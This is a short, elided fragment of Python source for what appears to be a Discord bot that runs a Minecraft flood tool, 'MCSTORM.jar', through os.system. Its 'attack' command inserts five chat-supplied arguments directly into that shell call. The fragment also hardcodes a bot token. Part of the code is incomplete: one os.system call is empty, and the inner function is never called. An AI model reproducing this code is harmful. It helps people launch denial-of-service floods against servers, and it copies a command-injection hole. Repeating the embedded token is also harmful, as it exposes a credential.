...
token = "MTA2Mzc2NTUzMjY4NTM4NTg0OQ.GuYW5g.X3gWwa8o1TfWzpEuaKP9Eil0O3kvtLL22qE1ns"
...
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack():
        os.system(
            f"java -jar MCSTORM.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")
